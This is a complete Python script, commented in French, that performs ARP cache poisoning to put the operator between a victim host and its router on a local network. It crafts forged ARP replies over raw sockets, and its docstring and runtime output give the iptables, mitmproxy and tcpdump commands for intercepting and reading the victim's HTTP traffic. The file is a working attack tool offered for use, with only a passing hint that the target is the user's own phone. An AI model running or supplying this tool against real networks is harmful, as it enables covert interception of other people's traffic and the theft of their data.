#!/usr/bin/env python3
"""
ARP MITM Poisoner — from scratch, raw sockets only
Intercepte le trafic entre une victime et le routeur sur le même LAN

Usage: sudo python3 arp_mitm.py -i wlan0 -t 192.168.1.42 -g 192.168.1.1
  -i  interface réseau (wlan0, eth0...)
  -t  IP de la victime (ton tel)
  -g  IP du gateway (routeur)

Pré-requis:
  sudo sysctl -w net.ipv4.ip_forward=1   ← active le forwarding AVANT
  sudo python3 arp_mitm.py ...
  puis dans un autre terminal:
    mitmproxy --mode transparent -p 8080
    sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080
"""

import socket, struct, fcntl, time, sys, argparse, threading, os, signal

# ─── ARP packet raw craft ───────────────────────────────────────────────────
# Ethernet frame: [dst_mac 6B][src_mac 6B][ethertype 2B] = 14B
# ARP header:     [htype 2B][ptype 2B][hlen 1B][plen 1B][oper 2B]
#                 [sha 6B][spa 4B][tha 6B][tpa 4B]         = 28B
# Total: 42 bytes

ETH_P_ARP  = 0x0806
ARP_REPLY  = 0x0002
ARP_REQ    = 0x0001

def mac_str_to_bytes(mac: str) -> bytes:
    return bytes(int(x, 16) for x in mac.split(':'))

def ip_str_to_bytes(ip: str) -> bytes:
    return bytes(int(x) for x in ip.split('.'))

def bytes_to_mac(raw: bytes) -> str:
    return ':'.join(f'{b:02x}' for b in raw)

def bytes_to_ip(raw: bytes) -> str:
    return '.'.join(str(b) for b in raw)

def get_local_mac(iface: str) -> bytes:
    """Récupère la MAC de l'interface via ioctl SIOCGIFHWADDR."""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        # SIOCGIFHWADDR = 0x8927
        info = fcntl.ioctl(s.fileno(), 0x8927, struct.pack('256s', iface[:15].encode()))
        return info[18:24]
    finally:
        s.close()

def get_local_ip(iface: str) -> str:
    """Récupère l'IP de l'interface."""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        info = fcntl.ioctl(s.fileno(), 0x8915, struct.pack('256s', iface[:15].encode()))  # SIOCGIFADDR
        return socket.inet_ntoa(info[20:24])
    finally:
        s.close()

def build_arp_packet(
    src_mac: bytes, dst_mac: bytes,
    spa: str, tpa: str,
    tha: bytes, oper: int = ARP_REPLY
) -> bytes:
    """
    Construit un paquet ARP Reply:
    src_mac : notre MAC (sender hardware address)
    dst_mac : MAC de la cible dans le header Ethernet
    spa     : IP qu'on usurpe (sender protocol address)
    tpa     : IP de la cible  (target protocol address)
    tha     : MAC réelle de la cible (target hardware address)
    """
    # Ethernet header
    eth = struct.pack('!6s6sH',
        dst_mac,    # dst
        src_mac,    # src
        ETH_P_ARP  # ethertype 0x0806
    )
    # ARP header
    arp = struct.pack('!HHBBH6s4s6s4s',
        0x0001,              # htype: Ethernet
        0x0800,              # ptype: IPv4
        6,                   # hlen
        4,                   # plen
        oper,                # REPLY (2) ou REQUEST (1)
        src_mac,             # SHA: notre MAC (on se fait passer pour spa)
        ip_str_to_bytes(spa),# SPA: IP usurpée
        tha,                 # THA: MAC de la cible
        ip_str_to_bytes(tpa) # TPA: IP de la cible
    )
    return eth + arp

def get_mac_via_arp(iface: str, target_ip: str, our_mac: bytes, our_ip: str,
                    timeout: float = 3.0) -> bytes | None:
    """
    Envoie un ARP request et attend la reply pour résoudre IP → MAC.
    """
    BROADCAST = b'\xff\xff\xff\xff\xff\xff'
    pkt = build_arp_packet(
        src_mac=our_mac, dst_mac=BROADCAST,
        spa=our_ip, tpa=target_ip,
        tha=b'\x00'*6, oper=ARP_REQ
    )
    # raw socket L2
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(ETH_P_ARP))
    s.bind((iface, 0))
    s.sendall(pkt)
    s.settimeout(timeout)
    deadline = time.time() + timeout
    try:
        while time.time() < deadline:
            raw = s.recv(64)
            if len(raw) < 42:
                continue
            # parse ARP reply
            oper    = struct.unpack('!H', raw[20:22])[0]
            sha     = raw[22:28]  # sender hardware address
            spa_raw = raw[28:32]  # sender protocol address
            if oper == ARP_REPLY and bytes_to_ip(spa_raw) == target_ip:
                return sha
    except socket.timeout:
        pass
    finally:
        s.close()
    return None

# ─── POISONER ─────────────────────────────────────────────────────────────────
RUNNING = True

def poison_loop(s: socket.socket, iface: str,
                our_mac: bytes,
                victim_ip: str, victim_mac: bytes,
                gateway_ip: str, gateway_mac: bytes,
                interval: float = 1.5):
    """
    *_mac : vraies MACs résolues au départ
    On envoie en boucle:
      → victim  : "le gateway c'est moi" (src_mac=nous, spa=gateway_ip, tpa=victim_ip)
      → gateway : "la victim c'est moi"  (src_mac=nous, spa=victim_ip, tpa=gateway_ip)
    """
    pkt_to_victim = build_arp_packet(
        src_mac=our_mac, dst_mac=victim_mac,
        spa=gateway_ip, tpa=victim_ip,
        tha=victim_mac
    )
    pkt_to_gw = build_arp_packet(
        src_mac=our_mac, dst_mac=gateway_mac,
        spa=victim_ip, tpa=gateway_ip,
        tha=gateway_mac
    )
    cnt = 0
    while RUNNING:
        s.sendall(pkt_to_victim)
        s.sendall(pkt_to_gw)
        cnt += 1
        print(f"\r  [💉] Paquets ARP envoyés: {cnt*2}  (CTRL+C pour stop)", end="", flush=True)
        time.sleep(interval)

def restore_arp(s: socket.socket,
                victim_ip: str, victim_mac: bytes,
                gateway_ip: str, gateway_mac: bytes):
    """Restaure les vraies MACs dans les tables ARP des deux machines."""
    print("\n[*] Restauration ARP tables...")
    for _ in range(5):
        # dit à la victime : "le gateway c'est vraiment gateway_mac"
        pkt1 = build_arp_packet(
            src_mac=gateway_mac, dst_mac=victim_mac,
            spa=gateway_ip, tpa=victim_ip,
            tha=victim_mac
        )
        # dit au gateway : "la victime c'est vraiment victim_mac"
        pkt2 = build_arp_packet(
            src_mac=victim_mac, dst_mac=gateway_mac,
            spa=victim_ip, tpa=gateway_ip,
            tha=gateway_mac
        )
        s.sendall(pkt1)
        s.sendall(pkt2)
        time.sleep(0.3)
    print("[✓] Tables ARP restaurées")

# ─── MAIN ─────────────────────────────────────────────────────────────────────
def main():
    p = argparse.ArgumentParser(description="ARP MITM Poisoner — raw sockets")
    p.add_argument("-i", "--iface",   required=True, help="Interface réseau (ex: wlan0)")
    p.add_argument("-t", "--target",  required=True, help="IP de la victime")
    p.add_argument("-g", "--gateway", required=True, help="IP du routeur/gateway")
    p.add_argument("--interval", type=float, default=1.5, help="Intervalle envoi ARP (défaut: 1.5s)")
    args = p.parse_args()

    if os.geteuid() != 0:
        print("[!] Lance avec sudo"); sys.exit(1)

    # vérifie le forwarding
    fwd = open("/proc/sys/net/ipv4/ip_forward").read().strip()
    if fwd != "1":
        print("[!] IP forwarding désactivé — lance d'abord:")
        print("    sudo sysctl -w net.ipv4.ip_forward=1")
        sys.exit(1)

    print(f"""
╔══════════════════════════════════════════════════════╗
║              ARP MITM POISONER                       ║
╠══════════════════════════════════════════════════════╣
║  Interface : {args.iface:<40}║
║  Victime   : {args.target:<40}║
║  Gateway   : {args.gateway:<40}║
╚══════════════════════════════════════════════════════╝
""")

    our_mac = get_local_mac(args.iface)
    our_ip  = get_local_ip(args.iface)
    print(f"[*] Notre MAC : {bytes_to_mac(our_mac)}")
    print(f"[*] Notre IP  : {our_ip}")

    # résolution MAC des deux cibles
    print(f"\n[*] Résolution MAC de la victime {args.target}...")
    victim_mac = get_mac_via_arp(args.iface, args.target, our_mac, our_ip)
    if not victim_mac:
        print(f"[✗] Impossible de résoudre {args.target} — tel éteint ou mauvaise IP")
        sys.exit(1)
    print(f"[✓] Victime  : {args.target} → {bytes_to_mac(victim_mac)}")

    print(f"[*] Résolution MAC du gateway {args.gateway}...")
    gw_mac = get_mac_via_arp(args.iface, args.gateway, our_mac, our_ip)
    if not gw_mac:
        print(f"[✗] Impossible de résoudre {args.gateway}")
        sys.exit(1)
    print(f"[✓] Gateway  : {args.gateway} → {bytes_to_mac(gw_mac)}")

    # raw socket L2 pour envoyer les paquets
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(ETH_P_ARP))
    s.bind((args.iface, 0))

    def on_sigint(sig, frame):
        global RUNNING
        RUNNING = False

    signal.signal(signal.SIGINT,  on_sigint)
    signal.signal(signal.SIGTERM, on_sigint)

    print(f"""
[*] MITM actif — trafic {args.target} ↔ {args.gateway} passe maintenant par toi

  Pour lire le trafic HTTP:
    sudo tcpdump -i {args.iface} -A host {args.target} and port 80

  Pour MITM complet avec mitmproxy:
    sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080
    mitmproxy --mode transparent -p 8080

  CTRL+C pour arrêter et restaurer les tables ARP
""")

    poison_loop(s, args.iface, our_mac,
                args.target, victim_mac,
                args.gateway, gw_mac,
                args.interval)

    restore_arp(s, args.target, victim_mac, args.gateway, gw_mac)
    s.close()
    print("[✓] Done.")

if __name__ == "__main__":
    main()
